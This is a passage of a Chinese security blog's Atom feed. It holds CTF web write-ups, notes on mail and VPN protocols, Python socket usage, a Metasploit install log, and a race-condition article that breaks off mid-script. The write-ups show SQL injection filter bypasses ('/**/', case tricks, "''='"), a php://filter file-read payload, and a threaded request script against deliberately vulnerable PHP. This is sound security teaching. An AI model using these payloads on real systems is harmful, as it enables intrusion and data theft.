yIhJvVkgk9Uhut9XT4y3S1uPOROwlo8ZLJswx1Iw91dIPze1/l4u3nPdKKC8VKTaabkzbtDiImxMcID6ZnyQLiPvBRgT2V1mcKqJtmuokUFhaErrxFmhuVKWfvK3+ryVRHRrNSpAyVT8UyDP+u25Gr/WX15tz3doCMcK2KlbgtNsBVYD/lKH/v3PLcLo5N8nL7yYnKTvZ1OUPGa0Og5oO+X5G2h8d8Uo6Fdy2e6/d2OQp1b6AqvthWtNBfYjdu0C9JJp1EeB5uBOzXfByrjMUcczi1eUlWTVyn1iRAoT94bAbOsCIh17QrGxSVDeIn1SINkZGf5WMqr5+KtUe+vsA64amJHYfdvtpggXiyBMokH2LTx8SxWWmXUJqOuo86L6HiiytP+FReVCW1IbAi1opMP4ITLHvOGca3U3LTzbMKCC7mX/vfxMORhfrgNSiIHKQAVWOfHEJiQHlxO4JBGel3+Xcb4w3HRDLCnLbeRbpSgAdBG5Ak9JLZ+K3IJuPKwTgfHCoGIRoQhXecbflTDfN7rY0CbV8vOOiItNtAdthM9Vo0v5fVt3sssTUG4ARSUC5FrSTz25fT/I5glrcHrnVoXOIH+eUB44OTD++3Ys5YPfi3CxnlGuY+A2KKXc9/hYX/7GzhzEXHXWcxwhEb7sgdgPLpv9Fa8FjmdwUwaFuAKjhz59QERrjy9/BoQUUOnlYRqFeLvKgA2L9k/6JNOxBYPPZxilzA3ntMEAi3jAg5sg261vo1cfICnYi4RnlYrNyalOMP04pmVK52BQMzzV58wikXcdB7fy4PwT4gvDenK9+aTCSfU0YDNZsKKOCO0ZWc+2W5T09FtB5jOz51aKOWR2GExHWOqBarF3Q2LRbeqE0ydkTzjVyt8b4uHTW5mxJtqYGEjajiELjizWQBiRhtk00b/6JbpzyN2XsRZbEX3NGRrlOt34MZpJrID5KgyDQbGONQqllbqiZL4kBZktldyC/vhlvBCIfsb/qfPttNzjXyF8d3ue7mIrmTQTTNtY9m3iaWfEFddO8Zm+i3TBV9vcfNvXB2RayWKlFSEdTehX</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>isg 3道web wp</title>
    <link href="https://vuln.top/2019/02/21/77/"/>
    <id>https://vuln.top/2019/02/21/77/</id>
    <published>2019-02-21T04:16:48.765Z</published>
    <updated>2019-02-23T15:15:00.592Z</updated>
    
    <content type="html"><![CDATA[<!--markdown-->第一题:calc<br><br>calc看样子是命令执行<br>通过n次尝试，成功执行代码<br><img src="http://118.126.66.150/52sec/08/3324016975.png" alt="W))I3(_DS[0$}GKXVHKJJ3W.png][1]![Q8F5HGA8WLF@W2{UER3E%MV.png][2]直接cat flag![R(IAP19Y7X~$IFQ9RRWP$YN.png][3]第二题:secret首先打开页面看到的是这个页面输入密码后![R9U))_{K5$~%W@LE00W4SDF.png][4]国际惯例查看下源代码，很兴奋的发现有flag![`]O}YTYQ84FF{WQD`F`PGN7.png"><br><br>base64解码！！！<br><img src="http://118.126.66.150/52sec/08/3038191672.png" alt="XDG9H2U$Z_)28NJKM3{BX%P.png"><br>发现啥都没有<br>被骗了。。。<br>然后我们get下/<br><img src="http://118.126.66.150/52sec/08/676655742.png" alt="LOG9$7@TZR$4J8`~LJ%6{24.png"><br>发现有个差不多的东西继续base64解码<br><img src="http://118.126.66.150/52sec/08/430533169.png" alt="B0VF58}S6FWXQ@A7KNFJ$2W.png"><br>成功获取flag<br><br>第三题:news<br>看样子是一道注入题，给了一个app.py<br>链接：<a href="https://pan.baidu.com/s/18Ro2aNB3wGrpVlbW5jLk8w" target="_blank" rel="noopener">https://pan.baidu.com/s/18Ro2aNB3wGrpVlbW5jLk8w</a> 密码：6noe<br>看了下源码很明显存在sql注入<br>找到过滤的关键字，判断条件估计就是写在codesafe类里面了<br><img src="http://118.126.66.150/52sec/08/1837997295.png" alt="55L(DADABDD2EL2(G_0Y\]E5.png"><br>果然<br><img src="http://118.126.66.150/52sec/08/1837997295.png" alt="KSXVU)F\]05@B_IMBA2I`}IJ.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if re.search(&quot;select&quot;, n) or re.search(&quot; &quot;, n) or re.search(&quot;where&quot;, n) or re.search(&quot;=&quot;, n) or re.search(&quot;&apos;&quot;, n):</span><br></pre></td></tr></table></figure><p>但是search不会匹配大小写那么我们可以从大小写入手过滤waf,空格则用/**/来代替<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by n</span><br></pre></td></tr></table></figure></p><p>判断列数量<br>2是正常，3则返回异常，有2列</p><p><img src="http://118.126.66.150/52sec/08/175972947.png" alt="H$4ACG~1W}312_JQH5K2JHQ.png"><br>直接使用union select 联合查询<br><img src="http://118.126.66.150/52sec/08/2006292326.png" alt="C0119`UFZ(~TV_9`QV`70$G.png"><br>成功返回说明数据库表是flag<br><img src="http://118.126.66.150/52sec/08/1765850669.png" alt="UWLZ87$J)R7OIVAZC{1DB66.png"><br>列尝试也使用flag<br>成功爆出flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!--markdown--&gt;第一题:calc&lt;br&gt;&lt;br&gt;calc看样子是命令执行&lt;br&gt;通过n次尝试，成功执行代码&lt;br&gt;&lt;img src=&quot;http://118.126.66.150/52sec/08/3324016975.png&quot; alt=&quot;W))I3(_DS[0$}G
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>[读书笔记] mail理论</title>
    <link href="https://vuln.top/2019/02/21/57/"/>
    <id>https://vuln.top/2019/02/21/57/</id>
    <published>2019-02-21T04:16:28.569Z</published>
    <updated>2019-02-23T15:25:24.667Z</updated>
    
    <content type="html"><![CDATA[<!--markdown-->很久之前的笔记整理下<br><br>MX代表的是MaileXchange，当一封邮件要发送出去的时候，邮件主机会先分析那封信的目标的DNS 先取得MX标志（注意 MX标志可能会有多部主机)然后以最优先MX主机为准将信发送出去<br><br>我们熟悉的outlook、foxmail等都是用来收信和发信的，称之为MUA:mail user agent，邮件用户代理<br><br>MUA并非直接将邮件发送至收件人手中，而是通过MTA:Mail Transfer Agent，邮件传输代理代传递，sendmail和postfix就是扮演MTA的角色<br><br>一封邮件的流程是：<br>发件人：<figure class="highlight plain"><figcaption><span>MTA --> 若干个MTA -> MTA -> MDA <-- 收取 --mua:收件人```< span></--></span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">MUA到MTA,以及MTA到MTA之间使用的协议就是SMTP协议，而收邮件时，MUA到MDA之间使用的协议是最常用的POP3或IMAP。</span><br></pre></td></tr></table></figure><p>MUA: 用户代理端，即用户使用的写信、收信客户端软件<br>MTA:邮件传送端，即常说的邮件服务器，用于转发、收取用户邮件<br>MDA:邮件代理端，相当于MUA和MTA的中间人，可用于过滤垃圾邮件<br>POP:邮局协议，用于MUA连接服务器收取用户邮件，通讯端口110<br>IMOP:互联网应用协议，功能较多POP多，通信端口143<br>SMTP:简单邮件传送协议，MUA连接MTA或MTA连接MTA发送邮件使用此协议，通讯端口25<br><code>`</code><br><img src="http://118.126.66.150/52sec/08/3640427257.gif" alt="mail-flow.gif"></p><p>1）发信端于收信端两台主机间会经过一个握手（ehlo）的阶段，此时发信端会被记录为发信来源<br>（而不是mail from）。通过握手后就可以进行邮件标题（header）的传送<br>2）此时收信端主机会分析标题的信息，若邮件的“mail to:主机名”为收信端主机，且该名称符合mydestination的设置，则该邮件会开始被接受到队列，并进一步送到mailbox当中；若不符合mydestination<br>的设置，则终止连接且不会进行邮件内容的传送<br>3）若“mail to：主机名“不是收信端本身，则开始进行中继转发（relay）的分析<br>4）转发过程首先分析该邮件的来源是否符合信任的客户端<br>5）分析邮件来源或目标是否符合relay_domains的设置，若符合则邮件将接受至队列，并等待MDA将邮件再转发出去<br>6）若这封邮件的标题数据都不符合上述的规范，则终止连接，并不会接受邮件的内容数据。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!--markdown--&gt;很久之前的笔记整理下&lt;br&gt;&lt;br&gt;MX代表的是MaileXchange，当一封邮件要发送出去的时候，邮件主机会先分析那封信的目标的DNS 先取得MX标志（注意 MX标志可能会有多部主机)然后以最优先MX主机为准将信发送出去&lt;br&gt;&lt;br&gt;我们熟悉的
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>vpn几种类型优缺点</title>
    <link href="https://vuln.top/2019/02/21/58/"/>
    <id>https://vuln.top/2019/02/21/58/</id>
    <published>2019-02-21T04:04:07.167Z</published>
    <updated>2019-02-21T04:04:07.180Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PPTP"><a href="#PPTP" class="headerlink" title="PPTP"></a><!--markdown-->PPTP</h2><p>PPTP(Point-to-Point Tunneling Protocol，点对点隧道协议)是由微软为了在拨号网络方面创建VPN而成立的一个团队开发而生，因此长期以来一直都是其企业内部的VPN标准协议。它也是一个通过搭配各种认证方法（通常是MS-CHAP v2）以提供安全性的VPN协议。因为PPTP协议作为一个在几乎所有有VPN能力的平台和设备上都可以无需安装额外软件而使用的标准，它至今仍然是企业和VPN供应商们的热门选择。同时，它有着低计算开销即可实现的优势（通俗地说就是运行速度很快）。<br>    • 几乎所有平台都内置好了PPTP协议的VPN客户端<br>    • 非常易于搭建<br>    • 不够安全（弱势的MSCHAPv2依旧被广泛使用）<br>    • 绝对妥协于NSA</p><h2 id="L2TP-以及-L2TP-IPsec"><a href="#L2TP-以及-L2TP-IPsec" class="headerlink" title="L2TP 以及 L2TP/IPsec"></a>L2TP 以及 L2TP/IPsec</h2><p>L2TP(Layer 2 Tunnel Protocol，第二层隧道协议)是一种协议本身不对通过的流量进行加密或实施保密措施的VPN协议。也正是因为这个原因，L2TP通常会结合IPsec加密套件（如下所述，类似于一种密码）来实现，以此提供安全性和隐私性。<br>L2TP/IPsec已经被内置于所有现代化操作系统以及具有VPN功能的设置，同时它也如PPTP一般，操作简单、可快速搭建（实际上它与PPTP使用的设备通常也是相同的）。<br>L2tp/IPsec会进行两次数据封装，这似乎会让速度慢下来。不过首先，它的加密解密行为发生在内核之中，其次LwTP/IPsec也允许多线程（OpenVPN并没有这个功能），这两点完全可以将两次数据封装造成的减速抵消掉，结果是L2TP在理论上会比OpenVPN更快。<br>    • 通常公认其安全<br>    • 易于搭建<br>    • 适用于全部现代化平台<br>    • 较OpenVPN更快<br>    • 或许已经向NSA妥协了（但未被证实）<br>    • 或许被NSA故意削弱过（但未被证实）<br>    • 会跟限制性防火墙产生冲突</p><h2 id="OpenVPN"><a href="#OpenVPN" class="headerlink" title="OpenVPN"></a>OpenVPN</h2><p>OpenVPN可以说是一种崭新的开源技术，它使用了OpenSSL库和SSLv3/TLSv1协议，通过与其他的技术融为一体，来提供一个强大而可靠的VPN解决方案。<br>    • 高度可配置性<br>    • 非常安全（如果使用了PFS完全正向加密，甚至对NSA都是安全的）<br>    • 可以绕过防火墙<br>    • 可以使用多种加密算法<br>    • 开源（因此可以很容易地去检查项目中的后门情况或者其他有可能被NSA修改过的地方）<br>    • 需要第三方软件<br>    • 安装过程比较繁琐<br>    • 尽管在努力改善对移动端设备的支持，缺还是不及桌面端的完善程度</p><h2 id="SSTP"><a href="#SSTP" class="headerlink" title="SSTP"></a>SSTP</h2><p>SSTP（Secure Socket Tunneling Protocol，安全套接字隧道协议）是微软在Windows Vista SP1时推出的，虽然它现在可用于Linux、RouterOS和SEIL，但是它极大程度上还是一种仅限Windows平台的协议（让它支持苹果设备的可能性等同于地狱里面出现了一个雪球）。<br>    • 非常安全（这取决于加密方式，不过通常使用AES就非常强大了）<br>    • 完全集成到了Windows操作系统中（Windows Vista SP1, Windows 7, Windows 8）<br>    • 微软官方支持<br>    • 可以绕过大多数防火墙<br>    • 只有在Windows环境才能真正工作<br>    • 作为微软的专有标准，不能被独立核查出后门以及其他问题</p><h2 id="IKEv2"><a href="#IKEv2" class="headerlink" title="IKEv2"></a>IKEv2</h2><p>IKEv2（Internet Key Exchange version 2，因特网密钥交换版本2）基于IPSec隧道协议，由微软和思科联合开发，并被兼并到了Windows7及以上版本中。<br>IKEv2有着非常实用的自动重连特性，当用户暂时失去互联网连接（比如进出火车隧道）的时候，它会自动重新建立VPN连接。对于手机用户来说确实是喜大普奔。Ikev2能跑在几乎所有iOS定制的VPN应用上，为了那些使用苹果公司官方VPN API的人无需越狱来使用它（也正因为这些优势，能让VPN供应商能够很容易地把更新配置文件推送到使用VPN的用户或者应用程序上）。<br>    • 比PPTP，SSTP和L2TP更快，它不涉及在点对点协议（Point-to-Point protocols，PPP）上的开销<br>    • 非常稳定 - 尤其是切换网络或者在短暂的网络连接丢失之后重新连接的时候<br>    • 非常安全 - 支持AES 128，AES 192，AES 256以及3DES加密算法<br>    • 易于安装和配置 - 至少在用户端是如此<br>    • 协议也支持黑莓的设备<br>    • 暂时还不支持很多的平台<br>    • 在服务器上搭建IKEv2相对来说很费劲，这也是很多问题的隐患所在 我们所对它的信任仅因为它进行了开源</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PPTP&quot;&gt;&lt;a href=&quot;#PPTP&quot; class=&quot;headerlink&quot; title=&quot;PPTP&quot;&gt;&lt;/a&gt;&lt;!--markdown--&gt;PPTP&lt;/h2&gt;&lt;p&gt;PPTP(Point-to-Point Tunneling Protocol，点对点隧道协议)
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>python socket 用法</title>
    <link href="https://vuln.top/2019/02/21/10/"/>
    <id>https://vuln.top/2019/02/21/10/</id>
    <published>2019-02-21T04:02:42.005Z</published>
    <updated>2019-02-21T04:02:42.017Z</updated>
    
    <content type="html"><![CDATA[<p><!--markdown-->1、Socket 类型<br>套接字格式：<br>socket(family,type[,protocal]) 使用给定的地址族、套接字类型、协议编号（默认为0）来创建套接字。</p><p>socket类型    描述<br>socket.AF_UNIX    只能够用于单一的Unix系统进程间通信<br>socket.AF_INET    服务器之间网络通信<br>socket.AF_INET6    IPv6<br>socket.SOCK_STREAM    流式socket , for TCP<br>socket.SOCK_DGRAM    数据报式socket , for UDP<br>socket.SOCK_RAW    原始套接字，普通的套接字无法处理ICMP、IGMP等网络报文，而SOCK_RAW可以；其次，SOCK_RAW也可以处理特殊的IPv4报文；此外，利用原始套接字，可以通过IP_HDRINCL套接字选项由用户构造IP头。<br>socket.SOCK_SEQPACKET    可靠的连续数据包服务<br>创建TCP Socket：    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>创建UDP Socket：    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</p><p>2、Socket 函数<br>注意点:<br>1）TCP发送数据时，已建立好TCP连接，所以不需要指定地址。UDP是面向无连接的，每次发送要指定是发给谁。<br>2）服务端与客户端不能直接发送列表，元组，字典。需要字符串化repr(data)。</p><p>socket函数        描述<br>服务端socket函数<br>s.bind(address)    将套接字绑定到地址, 在AF_INET下,以元组（host,port）的形式表示地址.<br>s.listen(backlog)    开始监听TCP传入连接。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。<br>s.accept()    接受TCP连接并返回（conn,address）,其中conn是新的套接字对象，可以用来接收和发送数据。address是连接客户端的地址。<br>客户端socket函数<br>s.connect(address)    连接到address处的套接字。一般address的格式为元组（hostname,port），如果连接出错，返回socket.error错误。<br>s.connect_ex(adddress)    功能与connect(address)相同，但是成功返回0，失败返回errno的值。<br>公共socket函数<br>s.recv(bufsize[,flag])    接受TCP套接字的数据。数据以字符串形式返回，bufsize指定要接收的最大数据量。flag提供有关消息的其他信息，通常可以忽略。<br>s.send(string[,flag])    发送TCP数据。将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。<br>s.sendall(string[,flag])    完整发送TCP数据。将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。<br>s.recvfrom(bufsize[.flag])    接受UDP套接字的数据。与recv()类似，但返回值是（data,address）。其中data是包含接收数据的字符串，address是发送数据的套接字地址。<br>s.sendto(string[,flag],address)    发送UDP数据。将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。<br>s.close()    关闭套接字。<br>s.getpeername()    返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。<br>s.getsockname()    返回套接字自己的地址。通常是一个元组(ipaddr,port)<br>s.setsockopt(level,optname,value)    设置给定套接字选项的值。<br>s.getsockopt(level,optname[.buflen])    返回套接字选项的值。<br>s.settimeout(timeout)    设置套接字操作的超时期，timeout是一个浮点数，单位是秒。值为None表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如connect()）<br>s.gettimeout()    返回当前超时期的值，单位是秒，如果没有设置超时期，则返回None。<br>s.fileno()    返回套接字的文件描述符。<br>s.setblocking(flag)    如果flag为0，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用recv()没有发现任何数据，或send()调用无法立即发送数据，那么将引起socket.error异常。<br>s.makefile()    创建一个与该套接字相关连的文件<br>3、socket编程思路<br>TCP服务端：<br>1 创建套接字，绑定套接字到本地IP与端口</p><h1 id="socket-socket-socket-AF-INET-socket-SOCK-STREAM-s-bind"><a href="#socket-socket-socket-AF-INET-socket-SOCK-STREAM-s-bind" class="headerlink" title="socket.socket(socket.AF_INET,socket.SOCK_STREAM) , s.bind()"></a>socket.socket(socket.AF_INET,socket.SOCK_STREAM) , s.bind()</h1><p>2 开始监听连接                   #s.listen()<br>3 进入循环，不断接受客户端的连接请求              #s.accept()<br>4 然后接收传来的数据，并发送给对方数据         #s.recv() , s.sendall()<br>5 传输完毕后，关闭套接字                     #s.close()</p><p>TCP客户端:<br>1 创建套接字，连接远端地址</p><pre><code># socket.socket(socket.AF_INET,socket.SOCK_STREAM) , s.connect()</code></pre><p>2 连接后发送数据和接收数据          # s.sendall(), s.recv()<br>3 传输完毕后，关闭套接字          #s.close()</p><p>来自 <a href="http://blog.csdn.net/rebelqsp/article/details/22109925" target="_blank" rel="noopener">http://blog.csdn.net/rebelqsp/article/details/22109925</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;!--markdown--&gt;1、Socket 类型&lt;br&gt;套接字格式：&lt;br&gt;socket(family,type[,protocal]) 使用给定的地址族、套接字类型、协议编号（默认为0）来创建套接字。&lt;/p&gt;
&lt;p&gt;socket类型    描述&lt;br&gt;socket.A
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mac上msf配置环境的坑</title>
    <link href="https://vuln.top/2019/02/21/116/"/>
    <id>https://vuln.top/2019/02/21/116/</id>
    <published>2019-02-21T04:02:20.086Z</published>
    <updated>2019-02-23T15:13:48.063Z</updated>
    
    <content type="html"><![CDATA[<p><!--markdown-->本来今天是准备用msf大干一场的结果发现msf炸了炸了！！！ ::aru:knife:: </p><p>不知道是不是因为更新了一波系统才炸的。</p><p>一开始是一个ruby版本的问题需要升级到ruby2.5.1</p><p>通过这条命令解决了:<code>rvm install 2.5.1 --with-openssl-dir=/usr/local/opt/openssl/bin/openssl</code></p><p><code>rm -f Gemfile.lock</code>切换到root模式下先把这玩意删了不然会有缓存</p><p>然后运行<code>bundle installl</code>后发现发现还要安装 nokogiri -v 1.8.4<br><img src="http://118.126.66.150/52sec/09/1834762529.png" alt="FA9695F6-E4F9-4A80-B6B8-994D5A7F42E3.png"></p><p>本想着通过gem能直接安装的后来发现我想多了，上帝不想让我睡觉（搞不完睡不着系列）。</p><p><img src="http://118.126.66.150/52sec/09/1799662772.png" alt="70E6E2F643BA40264AD030CD5B1A89DA.png"></p><p>我一开始尝试换源，终端走代理都不行，后来查出来发现是我gem的源。。换域名了。。。。(这个错我找了好久)</p><p><img src="http://118.126.66.150/52sec/09/1687912826.png" alt="2C908519-6A4C-49BD-90AD-BD009AD517CE.png"></p><p><code>gem sources --add https://gems.ruby-china.com/</code> #添加<br><code>gem sources -l</code>#查看<br><code>gem update --system</code> #更新</p><p><code>gem install bundle</code> #需要重新安装一遍<br><code>bundle install</code><br><img src="http://118.126.66.150/52sec/09/180492618.png" alt="D961E278-3388-47E7-B9AF-945470C66DA9.png"><br>都是原谅绿的就很开心…<br><img src="http://118.126.66.150/52sec/09/2876334475.png" alt="E2611118-8F9B-43A4-BABF-3C02EB5A76A1.png"></p><p>其实中间还有蛮多坑的但是我没保存下来就过了很可惜，写这篇文章主要是为了水一贴，顺便记录一下。</p><p>好晚了睡觉觉去了 ::aru:pouting:: </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;!--markdown--&gt;本来今天是准备用msf大干一场的结果发现msf炸了炸了！！！ ::aru:knife:: &lt;/p&gt;
&lt;p&gt;不知道是不是因为更新了一波系统才炸的。&lt;/p&gt;
&lt;p&gt;一开始是一个ruby版本的问题需要升级到ruby2.5.1&lt;/p&gt;
&lt;p&gt;通过这条命
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>记录下一道web题</title>
    <link href="https://vuln.top/2019/02/21/124/"/>
    <id>https://vuln.top/2019/02/21/124/</id>
    <published>2019-02-21T04:00:22.849Z</published>
    <updated>2019-02-23T15:14:20.326Z</updated>
    
    <content type="html"><![CDATA[<p><!--markdown-->题目名:真假难辨<br>点击页面的时候我发现这个页面没有表单。。<br><img src="http://118.126.66.150/52sec/10/488159467.png" alt="3B724733-D6B0-47F8-850A-5649E9161A10.png"><br>习惯性的扫了下目录文件<br>发现有一个.test.php.swp</p><p><img src="http://118.126.66.150/52sec/10/1807292108.png" alt="1A5BE925-BEAF-46D1-9812-E66357A912F2.png"><br><img src="http://118.126.66.150/52sec/10/1796908624.png" alt="E89D4D93-F91D-4CD3-95F6-DA70F6726B98.png"><br>发现mysql账号密码<br>一开始以为是构造表单提交到test.php里<br>但是后来发现没啥用,没错我就说着玩的…<br><img src="http://118.126.66.150/52sec/10/4172375584.png" alt="55179070-A281-40C9-92D8-D76AA9BDD339.png"><br>没办法get下index.php，发现有个hint访问index22222.php,这个才是真正的页面和原来页面长得一样,但是可以递交<br>我估计是万能密码sqlmap跑了下还真跑到了<br><img src="http://118.126.66.150/52sec/10/3249539132.png" alt="F1A78C66-CB2E-4647-B175-002F0357FCAB.png"><br>但是数据库,本地文件读取,什么的什么都没有权限,我在这上面弄了好久.<br>只能手工构造万能密码<br>过滤了<code>or,and,select</code>等…<br>最后试到<br><img src="http://118.126.66.150/52sec/10/3505957255.png" alt="507B8FEC-CA73-4AD3-A3C0-768B6FCEB76D.png"><br><code>&#39;&#39;=&#39;</code>成功绕过…<br><img src="http://118.126.66.150/52sec/10/161917790.png" alt="6D0584E7-5F95-45DA-B708-A8240987D66B.png"><br>后面就比较简单了闭着眼睛都知道是文件包含,用<code>php://filter</code>成功绕过<br>i&gt; php://filter/read=convert.base64-encode/resource=flag123456789.php</p><p><img src="http://118.126.66.150/52sec/10/1227329903.png" alt="5D1EEF8D-0C1E-48A5-9F05-B7EC51C47EAD.png"><br>解开base64获得flag<br>说实话不难,但是考了好几个知识点万能密码绕过waf,php伪协议文件包含</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;!--markdown--&gt;题目名:真假难辨&lt;br&gt;点击页面的时候我发现这个页面没有表单。。&lt;br&gt;&lt;img src=&quot;http://118.126.66.150/52sec/10/488159467.png&quot; alt=&quot;3B724733-D6B0-47F8-850A-5
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Web中的条件竞争漏洞</title>
    <link href="https://vuln.top/2019/02/21/164/"/>
    <id>https://vuln.top/2019/02/21/164/</id>
    <published>2019-02-21T03:57:27.827Z</published>
    <updated>2019-02-21T03:57:27.839Z</updated>
    
    <content type="html"><![CDATA[<!--markdown-->来源于：<a href="http://seaii-blog.com/index.php/2017/04/26/49.html" target="_blank" rel="noopener">http://seaii-blog.com/index.php/2017/04/26/49.html</a><br>0x01前言<br>放假回家前更一篇~ 之前做xctf联赛的时候多次碰到了这种类型的题目，之前没有好好了解过，被虐了很多次之后终于下定决心来仔细研究了解一波这个漏洞。。。<br><br>0x02漏洞成因<br>首先了解一个定义——竞争条件是什么？<br><br>竞争条件”发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。 ——Wikipedia-computer_science<br><br>开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。<br><br>线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，也被称之为临界区（critical section），如果没有应用好同步技术则会发生“竞争条件”问题。在我理解就是两只哈士奇（线程）同时去抢一个丢出去的飞盘（资源），不知道到底哪只能抢到，此处便形成了竞争。<br><br>0x03漏洞测试<br>只是干巴巴的说些定义可能对这个漏洞的理解不够透彻，最简单直接的方法还是自己用代码来测试一下。<br>现在我们模拟一个转账的情景<br><img src alt>前端水平有限，就是用来展示结果的，不要在意细节。。。。<br>后端处理代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $db = new mysqli(&apos;localhost&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;);</span><br><span class="line">    $sql = &quot;SELECT rest FROM account&quot;;</span><br><span class="line">    $rest = intval($db-&gt;query($sql)-&gt;fetch_assoc()[&apos;rest&apos;]);</span><br><span class="line">    </span><br><span class="line">    $sql = &quot;SELECT own FROM account&quot;;</span><br><span class="line">    $own = intval($db-&gt;query($sql)-&gt;fetch_assoc()[&apos;own&apos;]);</span><br><span class="line"></span><br><span class="line">    if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;GET&quot;) &#123;</span><br><span class="line">        $result = array(</span><br><span class="line">            &quot;rest&quot; =&gt; $rest,</span><br><span class="line">            &quot;own&quot;  =&gt; $own,</span><br><span class="line">        );</span><br><span class="line">        echo json_encode($result);</span><br><span class="line">    &#125; elseif ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;)&#123;</span><br><span class="line">        $money = intval($_POST[&apos;money&apos;]);</span><br><span class="line">        if($money &lt;= $rest) &#123;</span><br><span class="line">            $result = array(</span><br><span class="line">                &quot;status&quot; =&gt; &quot;success&quot;,</span><br><span class="line">                &quot;rest&quot;   =&gt; $rest - $money,</span><br><span class="line">                &quot;own&quot;    =&gt; $own  + $money, </span><br><span class="line">            );</span><br><span class="line">            echo json_encode($result);</span><br><span class="line"></span><br><span class="line">            $sql = &quot;UPDATE account SET rest=rest-&quot;.$money;</span><br><span class="line">            //$sql = &quot;UPDATE account SET rest=&quot;.$result[&apos;rest&apos;];</span><br><span class="line">            $db-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">            $sql = &quot;UPDATE account SET own=own+&quot;.$money;</span><br><span class="line">            //$sql = &quot;UPDATE account SET own=&quot;.$result[&apos;own&apos;];</span><br><span class="line">            $db-&gt;query($sql);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $result = array(</span><br><span class="line">                &quot;status&quot; =&gt; &quot;failed&quot;,</span><br><span class="line">                &quot;rest&quot;   =&gt; $rest,</span><br><span class="line">                &quot;own&quot;    =&gt; $own,</span><br><span class="line">            );</span><br><span class="line">            echo json_encode($result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p>配合前端ajax写的，后来测试中发现前端页面完全没用到23333333<br>使用py模拟转账操作，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1/race_condition.php&quot;</span><br><span class="line">threads = 25</span><br><span class="line">q = queue.Queue()</span><br><span class="line"></span><br><span class="line">for i in range(50):</span><br><span class="line">    q.put(i)</span><br><span class="line"></span><br><span class="line">def post():</span><br><span class="line">    while not q.empty():</span><br><span class="line">        q.get()</span><br><span class="line">        r = requests.post(url, data=&#123;&apos;money&apos;: 1&#125;)</span><br><span class="line">        print(r.text)</span><br><span 